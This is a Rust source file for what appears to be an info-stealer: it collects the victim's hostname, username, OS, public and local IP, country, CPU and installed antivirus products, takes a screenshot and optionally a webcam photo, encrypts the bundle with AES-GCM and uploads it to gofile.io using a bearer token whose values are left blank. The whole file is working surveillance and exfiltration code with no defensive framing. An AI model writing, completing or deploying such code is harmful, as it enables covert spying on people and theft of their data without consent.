use std::fs::File;

pub mod decrypt;
use std::io::Write;
use std::process::Command;
use serde::{Serialize, Deserialize};
use reqwest::blocking::Client;
use rmp_serde::{encode::to_vec as to_msgpack_vec};
use base64::{engine::general_purpose, Engine as _};
use whoami;
use sysinfo::System;
use aes_gcm::{Aes256Gcm, Nonce};
use aes_gcm::aead::{Aead, KeyInit};
use rand::Rng;


#[derive(Serialize, Deserialize, Debug)]
struct SystemInfo {
    hostname: String,
    os_name: String,
    os_version: String,
    username: String,
    global_ip: String,
    local_ip: String,
    cores: usize,
    security_software: Vec<String>,
    processor: String,
    country_code: String,
}

fn get_system_info() -> SystemInfo {
    let sys = sysinfo::System::new_all();
    // Hostname
    let hostname = whoami::fallible::hostname().unwrap_or_default();

    // OS info
    let info = os_info::get();
    let os_name = info.os_type().to_string();
    let os_version = info.version().to_string();

    // Username
    let username = std::env::var("USERNAME")
        .or_else(|_| std::env::var("USER"))
        .unwrap_or_default();

    // Global IP
    let global_ip = reqwest::blocking::get("https://api.ipify.org")
        .unwrap()
        .text()
        .unwrap_or_default();

    // Local IP
    let local_ip = local_ipaddress::get().unwrap_or_default();

    // CPU Cores & Processor
    let cores = sys.cpus().len();
    let processor = System::physical_core_count()
        .map(|_| sys.cpus().get(0).map_or("Unknown".to_string(), |c| c.brand().to_string()))
        .unwrap_or("Unknown".to_string());

    // Country code
    let country_code = reqwest::blocking::get("https://ipapi.co/country/")
        .unwrap()
        .text()
        .unwrap_or_default();

    // Antivirus software (Windows only)
    let security_software = get_antivirus_software();

    SystemInfo {
        hostname,
        os_name,
        os_version,
        username,
        global_ip,
        local_ip,
        cores,
        security_software,
        processor,
        country_code,
    }
}

// Windows only: retrieve security product names via WMI
fn get_antivirus_software() -> Vec<String> {
    // Official WMI crates are limited, so fetch via PowerShell here
    if cfg!(windows) {
        let output = Command::new("powershell")
            .args([
                "-Command",
                "Get-WmiObject -Namespace root/SecurityCenter2 -Class AntiVirusProduct | Select-Object -ExpandProperty displayName"
            ])
            .output();

        if let Ok(out) = output {
            let text = String::from_utf8_lossy(&out.stdout);
            text.lines().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect()
        } else {
            vec![]
        }
    } else {
        vec![]
    }
}

fn get_screenshot_base64() -> String {
    // scrap supports Windows/macOS/X11; Wayland may require additional setup
    let display = match scrap::Display::primary() {
        Ok(d) => d,
        Err(_) => return String::new(),
    };
    let mut capturer = match scrap::Capturer::new(display) {
        Ok(c) => c,
        Err(_) => return String::new(),
    };

    let (w, h) = (capturer.width(), capturer.height());

    // Capture frames (retry a few times because the first call often returns WouldBlock)
    for _ in 0..10u8 {
        match capturer.frame() {
            Ok(frame) => {
                // scrap pixels are BGRX/BGRA; reorder to RGBA for PNG
                let stride = w * 4; // Assume 4 bytes per pixel
                let mut rgba = Vec::with_capacity(w * h * 4);
                for y in 0..h {
                    let start = y * stride;
                    let end = start + stride;
                    let row = &frame[start..end];
                    for px in row.chunks_exact(4) {
                        // Convert B, G, R, X(A) to R, G, B, A (=255)
                        rgba.push(px[2]);
                        rgba.push(px[1]);
                        rgba.push(px[0]);
                        rgba.push(255);
                    }
                }

                if let Some(img) = image::RgbaImage::from_raw(w as u32, h as u32, rgba) {
                    let mut buf = Vec::new();
                    {
                        use image::codecs::png::PngEncoder;
                        use image::{ExtendedColorType, ImageEncoder};
                        let encoder = PngEncoder::new(&mut buf);
                        if encoder.write_image(
                            img.as_raw(),
                            img.width(),
                            img.height(),
                            ExtendedColorType::Rgba8,
                        ).is_ok() {
                            return general_purpose::STANDARD.encode(buf);
                        }
                    }
                }
                break;
            }
            Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                std::thread::sleep(std::time::Duration::from_millis(50));
                continue;
            }
            Err(_) => break,
        }
    }

    String::new()
}

// Webcam image capture (OpenCV, only when the 'webcam' feature is enabled)
#[cfg(feature = "webcam")]
fn get_webcam_image_base64() -> String {
    use opencv::{core, imgcodecs, prelude::*, videoio};

    let mut cam = match videoio::VideoCapture::new(0, videoio::CAP_ANY) {
        Ok(c) => c,
        Err(_) => return String::new(),
    };
    match cam.is_opened() {
        Ok(true) => {}
        _ => return String::new(),
    }

    let mut frame = core::Mat::default();
    if cam.read(&mut frame).is_err() {
        return String::new();
    }

    let mut buf = opencv::core::Vector::<u8>::new();
    let params = opencv::types::VectorOfint::new();
    if imgcodecs::imencode(".png", &frame, &mut buf, &params).is_err() {
        return String::new();
    }

    general_purpose::STANDARD.encode(buf.to_vec())
}

// Return an empty string when the 'webcam' feature is disabled
#[cfg(not(feature = "webcam"))]
fn get_webcam_image_base64() -> String {
    String::new()
}

// Perform the actual AES-GCM encryption
fn encrypt_data(data: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> Result<Vec<u8>, String> {
    let cipher = Aes256Gcm::new(aes_gcm::Key::<Aes256Gcm>::from_slice(key));
    let ciphertext = cipher.encrypt(Nonce::from_slice(nonce), data)
        .map_err(|e| format!("Encryption failed: {:?}", e))?;
    Ok(ciphertext)
}

fn main() {
    // 1. Gather system information
    let system_info = get_system_info();

    // 2. Capture screenshot
    let screenshot_base64 = get_screenshot_base64();

    // 3. Capture webcam image
    let webcam_image_base64 = get_webcam_image_base64();

    // 4. Serialize data
    let info_msgpack = to_msgpack_vec(&system_info).unwrap();
    let image_msgpack = to_msgpack_vec(&serde_json::json!({
        "screenshot": screenshot_base64,
        "webcam_image": webcam_image_base64,
    })).unwrap();

    // 5. Encrypt data
    let mut rng = rand::rng();
    let mut key = [0u8; 32];
    let mut nonce = [0u8; 12];
    rng.fill(&mut key);
    rng.fill(&mut nonce);
    
    // AES-GCM encryption (mandatory)
    let encrypted_info = encrypt_data(&info_msgpack, &key, &nonce)
        .map_err(|e| panic!("Failed to encrypt system information: {}", e))
        .unwrap();
    let encrypted_images = encrypt_data(&image_msgpack, &key, &nonce)
        .map_err(|e| panic!("Failed to encrypt image data: {}", e))
        .unwrap();

    // 6. Store the key and encrypted data separately
    // Save the key file
    let key_data = serde_json::json!({
        "key": general_purpose::STANDARD.encode(&key),
        "nonce": general_purpose::STANDARD.encode(&nonce),
    });
    
    let key_msgpack = to_msgpack_vec(&key_data).unwrap();
    let mut key_file = File::create("key.bin").unwrap();
    key_file.write_all(&key_msgpack).unwrap();
    println!("Saved AES-256 key: key.bin");
    
    // Save the data file (without the key)
    let final_data = to_msgpack_vec(&serde_json::json!({
        "info": general_purpose::STANDARD.encode(&encrypted_info),
        "images": general_purpose::STANDARD.encode(&encrypted_images),
        "encrypted": true,  // Always true in the new format
    })).unwrap();

    let mut f = File::create("data.dat").unwrap();
    f.write_all(&final_data).unwrap();

    // 7. Upload to gofile.io (using reqwest)
    upload_to_gofile("data.dat");
}

fn upload_to_gofile(file_path: &str) {
    let url = "";
    let token = ""; // Needs to be updated
    let folder_id = "";
    let client = Client::new();

    let form = reqwest::blocking::multipart::Form::new()
        .text("folderId", folder_id)
        .file("file", file_path).unwrap();

    let resp = client.post(url)
        .bearer_auth(token)
        .multipart(form)
        .send();

    match resp {
        Ok(r) if r.status().is_success() => {
            println!("File uploaded! {:?}", r.text().unwrap());
        },
        Ok(r) => {
            println!("Upload error: {}", r.status());
        },
        Err(e) => {
            println!("Request failed: {:?}", e);
        }
    }
}